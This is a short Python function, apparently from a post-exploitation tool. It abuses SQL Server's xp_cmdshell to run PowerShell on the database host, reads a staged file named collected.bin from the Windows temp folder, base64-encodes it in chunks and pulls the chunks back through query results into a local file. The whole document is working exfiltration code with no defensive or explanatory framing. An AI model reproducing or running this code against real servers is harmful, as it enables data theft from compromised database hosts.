import base64

def retrieve(connection, destination):
    cursor = connection.cursor()
    cursor.execute('EXEC master..xp_cmdshell \'powershell.exe -NoProfile -Command "$b=[IO.File]::ReadAllBytes(\'\'C:\\Windows\\Temp\\collected.bin\'\'); for($i=0;$i -lt $b.Length;$i+=144){[Console]::WriteLine([Convert]::ToBase64String($b,$i,[Math]::Min(144,$b.Length-$i)))}"\';')
    with open(destination, "wb") as output:
        for row in cursor:
            if row[0]:
                output.write(base64.b64decode(row[0]))
